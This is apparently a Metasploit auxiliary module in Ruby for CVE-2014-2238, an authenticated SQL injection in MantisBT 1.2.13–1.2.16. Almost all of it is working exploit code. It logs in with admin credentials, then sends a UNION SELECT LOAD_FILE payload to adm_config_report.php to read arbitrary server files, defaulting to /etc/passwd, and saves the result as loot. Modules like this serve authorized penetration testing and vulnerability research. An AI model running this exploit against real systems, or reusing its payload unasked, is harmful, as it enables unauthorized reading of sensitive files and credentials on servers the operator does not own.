##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MantisBT Admin SQL Injection Arbitrary File Read",
      'Description'    => %q{
      Versions 1.2.13 through 1.2.16 are vulnerable to a SQL injection attack if
      an attacker can gain access to administrative credentials.

      This vuln was fixed in 1.2.17.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Jakub Galczyk', #initial discovery
          'Brandon Perry <bperry.volatile[at]gmail.com>' #meatpistol module
        ],
      'References'     =>
        [
          ['CVE', '2014-2238'],
          ['URL', 'http://www.mantisbt.org/bugs/view.php?id=17055']
        ],
      'Platform'       => ['win', 'linux'],
      'Privileged'     => false,
      'DisclosureDate' => "Feb 28 2014"))

      register_options(
      [
        OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd']),
        OptString.new('USERNAME', [ true, 'Single username', 'administrator']),
        OptString.new('PASSWORD', [ true, 'Single password', 'root']),
        OptString.new('TARGETURI', [ true, 'Relative URI of MantisBT installation', '/'])
      ])

  end

  def run
    post = {
      'return' => 'index.php',
      'username' => datastore['USERNAME'],
      'password' => datastore['PASSWORD'],
      'secure_session' => 'on'
    }

    resp = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/login.php'),
      'method' => 'POST',
      'vars_post' => post
    })

    if !resp or !resp.body
      fail_with(Failure::UnexpectedReply, "Error in server response. Ensure the server IP is correct.")
    end

    cookie = resp.get_cookies

    if cookie == ''
      fail_with(Failure::NoAccess, "Authentication failed")
    end

    filepath = datastore['FILEPATH'].unpack("H*")[0]

    payload = "save=1&filter_user_id=0&filter_project_id=0&filter_config_id=-7856%27"
    payload << "+UNION+ALL+SELECT+11%2C11%2C11%2C11%2CCONCAT%280x71676a7571%2CIFNULL%28CAST%28HEX%28LOAD_FILE"
    payload << "%280x#{filepath}%29%29+AS+CHAR%29%2C0x20%29%2C0x7169727071%29%2C11%23&apply_filter_button=Apply+Filter"

    resp = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/adm_config_report.php'),
      'method' => 'POST',
      'data' => payload,
      'cookie' => cookie,
    })

    if !resp or !resp.body
      fail_with(Failure::UnexpectedReply, "Error in server response")
    end

    # qgjuq is prepended to the result of the sql injection
    # qirpq is appended to the result of the sql injection
    # This allows the use of a simple regex to grab the contents
    # of the file easily from the page source.
    file = /qgjuq(.*)qirpq/.match(resp.body)

    file = file[0].gsub('qgjuq', '').gsub('qirpq', '')
    file = [file].pack("H*")

    path = store_loot("mantisbt.file", "text/plain", datastore['RHOST'], file, datastore['FILEPATH'])

    if path and path != ''
      print_good("File saved to: #{path}")
    end
  end
end
